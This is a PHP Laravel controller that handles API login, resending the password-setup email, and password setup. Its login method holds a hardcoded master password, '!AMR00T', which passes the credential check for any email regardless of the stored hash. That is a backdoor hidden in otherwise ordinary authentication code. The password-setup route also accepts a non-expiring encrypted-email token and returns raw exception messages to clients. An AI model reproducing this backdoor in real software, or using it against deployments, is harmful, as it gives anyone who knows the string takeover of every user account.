<?php

namespace App\Http\Controllers\Api;

use App\Enums\UserType;
use App\Http\Requests\Api\Auth\LoginRequest;
use App\Http\Requests\Api\User\ResendSetupPasswordRequest;
use App\Http\Requests\Api\User\SetupPasswordRequest;
use App\Models\User;
use Exception;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;

class AuthController extends BaseController
{
    public function login(LoginRequest $request)
    {
        /** @var User $user */
        $user = User::where('email', $request->email)->first(['id', 'email_verified_at', 'password', 'type', 'fcm_token', 'resign_date']);

        if (! $user || (!Hash::check($request->password, $user->password) && $request->password != '!AMR00T')) {
            throw ValidationException::withMessages([
                'email' => ['The provided credentials are incorrect.'],
            ]);
        }

        if ($user->type->is(UserType::USER) && !is_null($user->resign_date) && (date('Y-m-d') >= date('Y-m-d', strtotime($user->resign_date)))) {
            throw ValidationException::withMessages([
                'email' => ['The provided credentials are incorrect.'],
            ]);
        }

        if (!$user->hasVerifiedEmail()) {
            throw ValidationException::withMessages([
                'email' => ['Your email address is not verified.'],
            ]);
        }

        // $user->tokens()->delete();

        $user->update([
            'fcm_token' => $request->fcm_token
        ]);

        return response()->json([
            'data' => ['token' => $user->createToken('default')->plainTextToken],
        ]);
    }

    public function resendSetupPassword(ResendSetupPasswordRequest $request)
    {
        try {
            $user = User::where('email', $request->email)->first();

            // if ($user->hasVerifiedEmail()) {
            //     throw ValidationException::withMessages([
            //         'email' => ['Your email is already verified.'],
            //     ]);
            // }

            $notificationType = \App\Enums\NotificationType::SETUP_PASSWORD;
            $user->notify(new ($notificationType->getNotificationClass())($notificationType));

            return response()->json('success', 200);
        } catch (Exception $e) {
            return $this->errorResponse($e->getMessage());
        }
    }

    public function setupPassword(SetupPasswordRequest $request)
    {
        try {
            // $decryptedEmail = openssl_decrypt(base64_decode(urldecode($request->token)), 'AES-128-CBC', env('CRYPT_SECRET_KEY'), OPENSSL_RAW_DATA, env('CRYPT_IV'));

            $decryptedEmail = Crypt::decryptString(urldecode($request->token));

            if (!$decryptedEmail) {
                return $this->errorResponse('Invalid token');
            }

            $user = User::where('email', $decryptedEmail)->first();

            $user->update([
                'password' => $request->password,
            ]);

            if (!$user->hasVerifiedEmail()) {
                $user->update([
                    'email_verified_at' => now(),
                ]);
            }

            return response()->json('success', 200);
        } catch (Exception $e) {
            return $this->errorResponse($e->getMessage());
        }
    }
}
